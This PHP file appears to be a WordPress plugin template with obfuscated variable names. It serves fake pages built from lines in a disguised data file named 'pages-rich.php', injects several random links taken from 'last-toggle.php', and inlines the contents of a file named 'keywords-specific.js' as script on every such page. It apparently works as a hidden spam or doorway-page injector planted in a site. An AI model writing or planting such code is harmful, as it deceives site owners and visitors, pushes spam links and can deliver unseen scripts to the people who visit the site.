<?php
$kIyso = intval(get_query_var('xmzcjlxw'));

if ($kIyso < 1 || $kIyso > 4415) return;
$wud5ohs = file(plugin_dir_path(__FILE__).'pages-rich.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$aTLLHFRLM = explode(';', $wud5ohs[$kIyso]);
if (count($aTLLHFRLM) < 2) return;
$wCHzpLh7X = $aTLLHFRLM[0];
$sNsht  = $aTLLHFRLM[1];
$v3jKtR0J8N = $aTLLHFRLM[2];
$mQBIi  = $aTLLHFRLM[3];
$dVspcGQ = $aTLLHFRLM[4];
set_query_var('ocuoave', $wCHzpLh7X);

$f81OXX = '';
$pwwBlzxZk = plugin_dir_path(__FILE__).'last-toggle.php';
if (is_file($pwwBlzxZk)) {
	$t4219 = file($pwwBlzxZk, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($t4219);
	shuffle($t4219);
	$lXOvryegQ = mt_rand(2, 5);
	if (count($t4219) > $lXOvryegQ) {
		for ($fesNM = 0; $fesNM < $lXOvryegQ; $fesNM++) {
			$jfu5Eplom3 = array_shift($t4219);
			$f81OXX .= '<p><a href="'.$jfu5Eplom3.'">'.$jfu5Eplom3.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $wCHzpLh7X; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $sNsht . "</p>\n";
				if (strlen($mQBIi) > 0) echo "<p>" . $mQBIi . "</p>\n";
				if (strlen($v3jKtR0J8N) > 0) echo "<p>" . $v3jKtR0J8N . "</p>\n";
				if (strlen($dVspcGQ) > 0) echo '<p><a href="#"><img src="'.$dVspcGQ.'"></a>' . "</p>\n";
				echo $f81OXX;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$cBa5LgV = plugin_dir_path(__FILE__) . 'keywords-specific.js';
if (is_file($cBa5LgV)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($cBa5LgV);
	echo '</script>';
}
get_footer();
?>
